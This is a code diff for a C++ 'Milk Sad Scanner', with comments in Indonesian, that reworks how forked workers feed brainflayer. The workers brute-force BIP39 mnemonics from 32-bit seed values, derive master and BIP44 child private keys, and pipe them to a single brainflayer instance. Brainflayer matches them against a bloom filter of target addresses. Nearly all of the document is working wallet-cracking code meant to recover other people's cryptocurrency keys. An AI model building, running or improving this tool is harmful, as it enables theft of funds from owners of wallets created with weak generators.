@@ -1,9 +1,11 @@
 /**
- * Milk Sad Scanner - Optimized Legacy Edition (v5 FULL)
+ * Milk Sad Scanner - Optimized Legacy Edition (v5 FULL) with Single Brainflayer Instance
  * 
- * Upgrade: 
- * - mengirim master key + child key BIP44 ke brainflayer
- * - progress reporting via file-based counters
+ * Upgrade:
+ * - Hanya satu proses brainflayer, semua worker menulis ke pipe.
+ * - Mengurangi penggunaan memori (bloom filter hanya di‑load sekali).
+ * - Output brainflayer digabung dalam satu file log.
+ * - Progress reporting tetap via file per worker.
  */
 
 #define _DEFAULT_SOURCE
@@ -32,7 +34,10 @@
 #include <atomic>
 #include <random>
 #include <cstring>
-#include <cstdio>   // untuk FILE*, fopen, dll
+#include <cstdio>
+#include <cstdint>
+#include <fcntl.h>      // untuk open, O_*
+#include <errno.h>
 
 // ================= CONFIG =================
 const std::string WORDLIST_FILE = "./Wordlist/english.txt";
@@ -43,7 +48,8 @@ const std::string BLOOM_FILTER = "./040823BF.blf";
 const int ENTROPY_BYTES = 24;
 
 // ================= GLOBAL =================
-std::vector<pid_t> g_child_pids;
+std::vector<pid_t> g_child_pids;   // worker pids
+pid_t g_brainflayer_pid = -1;
 std::atomic<bool> g_stop_flag(false);
 
 // ================= HELPERS =================
@@ -53,6 +59,7 @@ void signal_handler(int) {
     const char* msg = "\n[!] Interrupt. Stopping...\n";
     write(STDOUT_FILENO, msg, strlen(msg));
     for (pid_t pid : g_child_pids) if (pid > 0) kill(pid, SIGTERM);
+    if (g_brainflayer_pid > 0) kill(g_brainflayer_pid, SIGTERM);
 }
 
 bool file_exists(const std::string& filename) {
@@ -226,18 +233,10 @@ std::string to_hex(const std::vector<uint8_t>& data){
 
 // ================= WORKER =================
 void worker_process(int id, uint64_t start, uint64_t end, int step,
-                    const std::vector<std::string>& wordlist, int num_derivations) {
+                    const std::vector<std::string>& wordlist, int num_derivations,
+                    int pipe_fd) {
 
     CryptoContext cc;
-
-    std::string log_file = OUTPUT_PREFIX + std::to_string(id) + ".log";
-    std::string cmd = BRAINFLAYER_BIN + " -v -b " + BLOOM_FILTER + " -t priv -x > " + log_file;
-
-    FILE* pipe = popen(cmd.c_str(), "w");
-    if (!pipe) return;
-
-    char buffer[4096];
-    setvbuf(pipe, buffer, _IOFBF, sizeof(buffer));
 
     const uint32_t H = 0x80000000;
 
@@ -247,18 +246,31 @@ void worker_process(int id, uint64_t start, uint64_t end, int step,
 
     for (uint64_t ts = start; ts <= end && !g_stop_flag; ts += step) {
 
-        std::string m = generate_mnemonic_bip39((uint32_t)ts, wordlist);
+        if (ts > UINT32_MAX) continue;
+        uint32_t seed_val = (uint32_t)ts;
+
+        std::string m = generate_mnemonic_bip39(seed_val, wordlist);
         auto seed = mnemonic_to_seed(m);
         auto master = hd_master_key_from_seed(seed);
 
         // Kirim master private key
         std::string master_hex = to_hex(master.key);
-        fprintf(pipe, "%s\n", master_hex.c_str());
+        if (dprintf(pipe_fd, "%s\n", master_hex.c_str()) < 0) {
+            // Pipe error, kemungkinan brainflayer mati
+            break;
+        }
 
+        // Derivation BIP44: m/44'/0'/0'
         auto k44 = CKDpriv_fast(master, 44 | H, cc);
-        auto kCoin = CKDpriv_fast(k44, 0 | H, cc);
-        auto kAcc = CKDpriv_fast(kCoin, 0 | H, cc);
+        if (!k44.valid) continue;
 
+        auto kCoin = CKDpriv_fast(k44, 0 | H, cc);
+        if (!kCoin.valid) continue;
+
+        auto kAcc = CKDpriv_fast(kCoin, 0 | H, cc);
+        if (!kAcc.valid) continue;
+
+        // Loop untuk chain eksternal (0) dan internal (1)
         for (uint32_t chain = 0; chain <= 1; ++chain) {
 
             auto kChange = CKDpriv_fast(kAcc, chain, cc);
@@ -271,7 +283,10 @@ void worker_process(int id, uint64_t start, uint64_t end, int step,
                 auto child = CKDpriv_fast(kChange, idx++, cc);
                 if (!child.valid) continue;
                 std::string hex = to_hex(child.key);
-                fprintf(pipe, "%s\n", hex.c_str());
+                if (dprintf(pipe_fd, "%s\n", hex.c_str()) < 0) {
+                    // Pipe error
+                    goto finish;  // keluar dari semua loop
+                }
                 derived++;
             }
         }
@@ -287,19 +302,19 @@ void worker_process(int id, uint64_t start, uint64_t end, int step,
         }
     }
 
+finish:
     // Tulis progress terakhir
     FILE* fp = fopen(prog_file.c_str(), "w");
     if (fp) {
         fprintf(fp, "%llu\n", (unsigned long long)processed_timestamps);
         fclose(fp);
     }
-
-    pclose(pipe);
 }
 
 // ================= MAIN =================
 int main() {
-
+    // Abaikan SIGPIPE agar write ke pipe yang mati tidak mematikan worker
+    signal(SIGPIPE, SIG_IGN);
     signal(SIGINT, signal_handler);
 
     if (!file_exists(BRAINFLAYER_BIN) || !file_exists(BLOOM_FILTER)) {
@@ -324,33 +339,81 @@ int main() {
     int threads;
     std::cout << "Threads: "; std::cin >> threads;
 
-    g_child_pids.resize(threads);
+    // Buat pipe untuk komunikasi worker -> brainflayer
+    int pipefd[2];
+    if (pipe(pipefd) == -1) {
+        perror("pipe");
+        return 1;
+    }
 
+    // Fork brainflayer
+    g_brainflayer_pid = fork();
+    if (g_brainflayer_pid == 0) {
+        // Child: brainflayer
+        close(pipefd[1]);                // tutup write
+        dup2(pipefd[0], STDIN_FILENO);   // baca dari pipe
+        close(pipefd[0]);
+
+        // Redirect stdout ke file log
+        std::string logfile = OUTPUT_PREFIX + "brainflayer.log";
+        int fd_out = open(logfile.c_str(), O_WRONLY | O_CREAT | O_TRUNC, 0644);
+        if (fd_out == -1) {
+            perror("open logfile");
+            exit(1);
+        }
+        dup2(fd_out, STDOUT_FILENO);
+        close(fd_out);
+
+        // Exec brainflayer
+        execlp(BRAINFLAYER_BIN.c_str(),
+               BRAINFLAYER_BIN.c_str(),
+               "-v", "-b", BLOOM_FILTER.c_str(),
+               "-t", "priv", "-x", NULL);
+        perror("execlp brainflayer");
+        exit(1);
+    } else if (g_brainflayer_pid < 0) {
+        perror("fork brainflayer");
+        return 1;
+    }
+
+    // Parent: tutup sisi baca pipe
+    close(pipefd[0]);
+    int pipe_write_fd = pipefd[1];   // fd untuk menulis ke brainflayer
+
+    // Fork worker
+    g_child_pids.resize(threads);
     for (int i = 0; i < threads; i++) {
         pid_t pid = fork();
         if (pid == 0) {
-            worker_process(i, start + i, end, threads, wordlist, 2);
+            // Worker process
+            worker_process(i, start + i, end, threads, wordlist, 5, pipe_write_fd);
             exit(0);
-        } else {
+        } else if (pid > 0) {
             g_child_pids[i] = pid;
+        } else {
+            perror("fork worker");
+            // Tetap lanjut dengan thread yang ada
         }
     }
+
+    // Parent tidak perlu menulis ke pipe, tutup salinan fd-nya
+    close(pipe_write_fd);
 
     // --- Progress monitoring loop ---
     time_t start_time = time(nullptr);
     uint64_t last_processed = 0;
 
     while (true) {
-        sleep(2); // Update setiap 2 detik
+        sleep(2);
 
-        // Cek apakah semua child masih hidup
+        // Cek apakah semua worker masih hidup
         int alive = 0;
         for (pid_t pid : g_child_pids) {
             if (kill(pid, 0) == 0) alive++;
         }
         if (alive == 0) break; // Semua selesai
 
-        // Baca progress dari setiap child
+        // Baca progress dari setiap worker
         uint64_t sum_processed = 0;
         for (pid_t pid : g_child_pids) {
             std::string prog_file = "/tmp/milksad_progress_" + std::to_string(pid) + ".tmp";
@@ -378,12 +441,15 @@ int main() {
         last_processed = sum_processed;
     }
 
+    // Semua worker selesai, tunggu brainflayer (yang akan EOF karena pipe tertutup)
+    waitpid(g_brainflayer_pid, nullptr, 0);
+
     // Hapus file progress
     for (pid_t pid : g_child_pids) {
         std::string prog_file = "/tmp/milksad_progress_" + std::to_string(pid) + ".tmp";
         unlink(prog_file.c_str());
     }
 
-    printf("\nDone. Semua proses selesai.\n");
+    printf("\nDone. Semua proses selesai. Output brainflayer di %sbrainflayer.log\n", OUTPUT_PREFIX.c_str());
     return 0;
 }
